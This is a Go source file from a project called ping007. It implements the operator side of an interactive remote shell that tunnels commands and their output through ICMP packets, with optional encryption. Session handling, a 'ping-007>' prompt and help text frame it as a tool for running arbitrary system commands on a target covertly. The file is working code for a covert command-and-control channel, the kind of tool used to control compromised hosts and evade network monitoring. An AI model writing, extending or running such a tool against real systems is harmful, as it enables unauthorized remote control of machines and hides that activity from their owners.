package shell

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"ping007/internal/crypto"
	"ping007/internal/network"
	"ping007/pkg/types"
)

type ShellEngine struct {
	networkService *network.NetworkService
	cryptoEngine   *crypto.CryptoEngine
	config         ShellConfig
	activeSessions map[string]*ShellSession
	mu             sync.RWMutex
}

type ShellConfig struct {
	MaxSessions       int
	SessionTimeout    time.Duration
	CommandTimeout    time.Duration
	MaxOutputSize     int
	EncryptionEnabled bool
}

type ShellSession struct {
	ID           string
	Target       string
	Mode         string
	Created      time.Time
	LastActivity time.Time
	Commands     []*types.ShellCommand
	Responses    []*types.ShellResponse
	Active       bool
	mu           sync.RWMutex
}

func NewShellEngine(
	networkService *network.NetworkService,
	cryptoEngine *crypto.CryptoEngine,
	config ShellConfig,
) *ShellEngine {
	return &ShellEngine{
		networkService: networkService,
		cryptoEngine:   cryptoEngine,
		config:         config,
		activeSessions: make(map[string]*ShellSession),
	}
}

// StartSession initiates a new shell session
func (s *ShellEngine) StartSession(sessionID, target, mode string) (*ShellSession, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	// Check session limits
	if len(s.activeSessions) >= s.config.MaxSessions {
		return nil, fmt.Errorf("maximum sessions reached (%d)", s.config.MaxSessions)
	}

	// Check if session already exists
	if _, exists := s.activeSessions[sessionID]; exists {
		return nil, fmt.Errorf("session already exists: %s", sessionID)
	}

	// Create new session
	session := &ShellSession{
		ID:           sessionID,
		Target:       target,
		Mode:         mode,
		Created:      time.Now(),
		LastActivity: time.Now(),
		Commands:     make([]*types.ShellCommand, 0),
		Responses:    make([]*types.ShellResponse, 0),
		Active:       true,
	}

	s.activeSessions[sessionID] = session

	// Send session initialization
	err := s.sendSessionInit(session)
	if err != nil {
		delete(s.activeSessions, sessionID)
		return nil, fmt.Errorf("failed to initialize session: %w", err)
	}

	return session, nil
}

// ExecuteCommand executes a command in the specified session
func (s *ShellEngine) ExecuteCommand(sessionID, command string, args []string) (*types.ShellResponse, error) {
	session, err := s.getSession(sessionID)
	if err != nil {
		return nil, err
	}

	// Create command
	cmd := &types.ShellCommand{
		ID:         fmt.Sprintf("%s-%d", sessionID, len(session.Commands)),
		Type:       "exec",
		Command:    command,
		Args:       args,
		Timeout:    int(s.config.CommandTimeout.Seconds()),
		Timestamp:  time.Now(),
	}

	// Record command
	session.mu.Lock()
	session.Commands = append(session.Commands, cmd)
	session.LastActivity = time.Now()
	session.mu.Unlock()

	// Execute based on mode
	switch session.Mode {
	case "interactive":
		return s.executeInteractive(session, cmd)
	case "batch":
		return s.executeBatch(session, cmd)
	default:
		return nil, fmt.Errorf("unsupported shell mode: %s", session.Mode)
	}
}

// executeInteractive executes command in interactive mode
func (s *ShellEngine) executeInteractive(session *ShellSession, cmd *types.ShellCommand) (*types.ShellResponse, error) {
	startTime := time.Now()

	// Send command via ICMP
	err := s.sendCommand(session, cmd)
	if err != nil {
		return nil, fmt.Errorf("failed to send command: %w", err)
	}

	// Wait for response
	response, err := s.receiveResponse(session, cmd.ID)
	if err != nil {
		return nil, fmt.Errorf("failed to receive response: %w", err)
	}

	response.ExecutionTime = time.Since(startTime)

	// Record response
	session.mu.Lock()
	session.Responses = append(session.Responses, response)
	session.mu.Unlock()

	return response, nil
}

// executeBatch executes command locally (for testing/demo)
func (s *ShellEngine) executeBatch(session *ShellSession, cmd *types.ShellCommand) (*types.ShellResponse, error) {
	startTime := time.Now()

	// Create response
	response := &types.ShellResponse{
		CommandID:  cmd.ID,
		Timestamp:  time.Now(),
	}

	// Determine shell based on OS
	var shell string
	var shellArg string
	if runtime.GOOS == "windows" {
		shell = "cmd"
		shellArg = "/C"
	} else {
		shell = "/bin/sh"
		shellArg = "-c"
	}

	// Build full command
	fullCommand := cmd.Command
	if len(cmd.Args) > 0 {
		fullCommand += " " + strings.Join(cmd.Args, " ")
	}

	// Execute command with timeout
	ctx, cancel := context.WithTimeout(context.Background(), s.config.CommandTimeout)
	defer cancel()

	execCmd := exec.CommandContext(ctx, shell, shellArg, fullCommand)

	// Set working directory if specified
	if cmd.WorkingDir != "" {
		execCmd.Dir = cmd.WorkingDir
	}

	// Execute and capture output
	output, err := execCmd.CombinedOutput()

	response.ExecutionTime = time.Since(startTime)

	if err != nil {
		response.Success = false
		response.ReturnCode = 1
		response.Stderr = err.Error()
	} else {
		response.Success = true
		response.ReturnCode = 0
	}

	// Limit output size
	outputStr := string(output)
	if len(outputStr) > s.config.MaxOutputSize {
		outputStr = outputStr[:s.config.MaxOutputSize] + "... [truncated]"
	}

	response.Stdout = outputStr

	// Record response
	session.mu.Lock()
	session.Responses = append(session.Responses, response)
	session.mu.Unlock()

	return response, nil
}

// sendCommand sends a command packet via ICMP
func (s *ShellEngine) sendCommand(session *ShellSession, cmd *types.ShellCommand) error {
	packetBuilder := network.NewPacketBuilder(session.ID)

	// Serialize command data
	commandData := fmt.Sprintf("CMD:%s:%s", cmd.ID, cmd.Command)
	if len(cmd.Args) > 0 {
		commandData += ":" + strings.Join(cmd.Args, " ")
	}

	// Create packet
	packet := packetBuilder.CreateDataPacket([]byte(commandData), "command")

	// Add shell-specific headers
	packet.Headers["type"] = "shell_command"
	packet.Headers["session_id"] = session.ID
	packet.Headers["command_id"] = cmd.ID

	// Encrypt if enabled
	if s.config.EncryptionEnabled && s.cryptoEngine != nil {
		encryptedData, err := s.cryptoEngine.Encrypt(packet.Payload)
		if err != nil {
			return fmt.Errorf("encryption failed: %w", err)
		}
		packet.Payload = encryptedData
		packet.Headers["encrypted"] = true
	}

	// Send packet
	return s.networkService.SendPacket(packet, session.Target)
}

// receiveResponse waits for and processes a command response
func (s *ShellEngine) receiveResponse(session *ShellSession, commandID string) (*types.ShellResponse, error) {
	timeout := s.config.CommandTimeout
	startTime := time.Now()

	for time.Since(startTime) < timeout {
		// Receive packet
		packet, err := s.networkService.ReceivePacket(1 * time.Second)
		if err != nil {
			continue // Timeout, keep trying
		}

		// Check if this is a response packet
		if sessionID, ok := packet.Headers["session_id"].(string); ok && sessionID == session.ID {
			if respCmdID, ok := packet.Headers["command_id"].(string); ok && respCmdID == commandID {
				return s.parseResponse(packet)
			}
		}
	}

	return nil, fmt.Errorf("response timeout for command %s", commandID)
}

// parseResponse parses a response packet
func (s *ShellEngine) parseResponse(packet *types.NetworkPacket) (*types.ShellResponse, error) {
	response := &types.ShellResponse{
		Timestamp: time.Now(),
	}

	// Decrypt if needed
	payload := packet.Payload
	if encrypted, ok := packet.Headers["encrypted"].(bool); ok && encrypted {
		if s.cryptoEngine != nil {
			decryptedData, err := s.cryptoEngine.Decrypt(payload)
			if err != nil {
				return nil, fmt.Errorf("decryption failed: %w", err)
			}
			payload = decryptedData
		}
	}

	// Parse response format: "RESP:command_id:success:return_code:stdout:stderr"
	responseStr := string(payload)
	parts := strings.SplitN(responseStr, ":", 6)

	if len(parts) >= 4 && parts[0] == "RESP" {
		response.CommandID = parts[1]
		response.Success = parts[2] == "true"

		if _, err := fmt.Sscanf(parts[3], "%d", &response.ReturnCode); err != nil {
			response.ReturnCode = -1
		}

		if len(parts) >= 5 {
			response.Stdout = parts[4]
		}
		if len(parts) >= 6 {
			response.Stderr = parts[5]
		}
	} else {
		return nil, fmt.Errorf("invalid response format")
	}

	return response, nil
}

// sendSessionInit sends session initialization packet
func (s *ShellEngine) sendSessionInit(session *ShellSession) error {
	packetBuilder := network.NewPacketBuilder(session.ID)

	// Create init message
	initData := fmt.Sprintf("INIT:%s:%s", session.ID, session.Mode)
	packet := packetBuilder.CreateDataPacket([]byte(initData), "session_init")

	packet.Headers["type"] = "shell_init"
	packet.Headers["session_id"] = session.ID

	return s.networkService.SendPacket(packet, session.Target)
}

// InteractiveShell starts an interactive shell session
func (s *ShellEngine) InteractiveShell(sessionID, target string) error {
	session, err := s.StartSession(sessionID, target, "interactive")
	if err != nil {
		return fmt.Errorf("failed to start session: %w", err)
	}

	fmt.Printf("PING-007 Shell Session Started\n")
	fmt.Printf("Session ID: %s\n", session.ID)
	fmt.Printf("Target: %s\n", session.Target)
	fmt.Printf("Type 'exit' to quit, 'help' for commands\n\n")

	scanner := bufio.NewScanner(os.Stdin)

	for {
		fmt.Print("ping-007> ")

		if !scanner.Scan() {
			break
		}

		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		// Handle built-in commands
		switch line {
		case "exit", "quit":
			fmt.Println("Closing session...")
			s.CloseSession(sessionID)
			return nil

		case "help":
			s.printHelp()
			continue

		case "status":
			s.printSessionStatus(session)
			continue

		case "history":
			s.printCommandHistory(session)
			continue
		}

		// Parse command
		parts := strings.Fields(line)
		if len(parts) == 0 {
			continue
		}

		command := parts[0]
		args := parts[1:]

		// Execute command
		response, err := s.ExecuteCommand(sessionID, command, args)
		if err != nil {
			fmt.Printf("Error: %v\n", err)
			continue
		}

		// Display response
		if response.Success {
			if response.Stdout != "" {
				fmt.Print(response.Stdout)
			}
		} else {
			fmt.Printf("Command failed (exit code %d)\n", response.ReturnCode)
			if response.Stderr != "" {
				fmt.Printf("Error: %s\n", response.Stderr)
			}
		}

		fmt.Printf("\n[Executed in %v]\n\n", response.ExecutionTime)
	}

	return nil
}

// printHelp displays help information
func (s *ShellEngine) printHelp() {
	fmt.Println(`PING-007 Shell Commands:

Built-in Commands:
  exit, quit    - Close the shell session
  help          - Show this help message
  status        - Show session status
  history       - Show command history

System Commands:
  Any system command will be executed on the target via ICMP tunnel

Examples:
  ls -la        - List files
  pwd           - Show current directory
  whoami        - Show current user
  ps aux        - Show processes
  cat /etc/hosts - Display file content`)
}

// printSessionStatus displays session status
func (s *ShellEngine) printSessionStatus(session *ShellSession) {
	session.mu.RLock()
	defer session.mu.RUnlock()

	fmt.Printf(`
Session Status:
  ID: %s
  Target: %s
  Mode: %s
  Created: %s
  Last Activity: %s
  Commands Executed: %d
  Active: %t
`,
		session.ID,
		session.Target,
		session.Mode,
		session.Created.Format("2006-01-02 15:04:05"),
		session.LastActivity.Format("2006-01-02 15:04:05"),
		len(session.Commands),
		session.Active,
	)
}

// printCommandHistory displays command history
func (s *ShellEngine) printCommandHistory(session *ShellSession) {
	session.mu.RLock()
	defer session.mu.RUnlock()

	fmt.Printf("\nCommand History (%d commands):\n", len(session.Commands))

	for i, cmd := range session.Commands {
		timestamp := cmd.Timestamp.Format("15:04:05")
		cmdStr := cmd.Command
		if len(cmd.Args) > 0 {
			cmdStr += " " + strings.Join(cmd.Args, " ")
		}

		var status string
		if i < len(session.Responses) {
			resp := session.Responses[i]
			if resp.Success {
				status = "[OK]"
			} else {
				status = fmt.Sprintf("[FAIL:%d]", resp.ReturnCode)
			}
		} else {
			status = "[PENDING]"
		}

		fmt.Printf("  %2d. [%s] %s %s\n", i+1, timestamp, status, cmdStr)
	}
	fmt.Println()
}

// getSession retrieves a session by ID
func (s *ShellEngine) getSession(sessionID string) (*ShellSession, error) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	session, exists := s.activeSessions[sessionID]
	if !exists {
		return nil, fmt.Errorf("session not found: %s", sessionID)
	}

	if !session.Active {
		return nil, fmt.Errorf("session is inactive: %s", sessionID)
	}

	// Check timeout
	if time.Since(session.LastActivity) > s.config.SessionTimeout {
		session.Active = false
		return nil, fmt.Errorf("session expired: %s", sessionID)
	}

	return session, nil
}

// CloseSession terminates a shell session
func (s *ShellEngine) CloseSession(sessionID string) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	session, exists := s.activeSessions[sessionID]
	if !exists {
		return fmt.Errorf("session not found: %s", sessionID)
	}

	// Send close command
	packetBuilder := network.NewPacketBuilder(sessionID)
	closeData := fmt.Sprintf("CLOSE:%s", sessionID)
	packet := packetBuilder.CreateDataPacket([]byte(closeData), "session_close")

	packet.Headers["type"] = "shell_close"
	packet.Headers["session_id"] = sessionID

	// Send close packet (best effort)
	s.networkService.SendPacket(packet, session.Target)

	// Mark as inactive and remove
	session.Active = false
	delete(s.activeSessions, sessionID)

	return nil
}

// GetActiveSessions returns list of active sessions
func (s *ShellEngine) GetActiveSessions() []*ShellSession {
	s.mu.RLock()
	defer s.mu.RUnlock()

	sessions := make([]*ShellSession, 0, len(s.activeSessions))
	for _, session := range s.activeSessions {
		if session.Active {
			sessions = append(sessions, session)
		}
	}

	return sessions
}

// CleanupExpiredSessions removes expired sessions
func (s *ShellEngine) CleanupExpiredSessions() {
	s.mu.Lock()
	defer s.mu.Unlock()

	for sessionID, session := range s.activeSessions {
		if time.Since(session.LastActivity) > s.config.SessionTimeout {
			session.Active = false
			delete(s.activeSessions, sessionID)
		}
	}
}

// GetSessionStats returns shell session statistics
func (s *ShellEngine) GetSessionStats() map[string]any {
	s.mu.RLock()
	defer s.mu.RUnlock()

	activeSessions := 0
	totalCommands := 0

	for _, session := range s.activeSessions {
		if session.Active {
			activeSessions++
			session.mu.RLock()
			totalCommands += len(session.Commands)
			session.mu.RUnlock()
		}
	}

	return map[string]any{
		"active_sessions":  activeSessions,
		"total_sessions":   len(s.activeSessions),
		"total_commands":   totalCommands,
		"max_sessions":     s.config.MaxSessions,
		"session_timeout":  s.config.SessionTimeout.String(),
		"command_timeout":  s.config.CommandTimeout.String(),
	}
}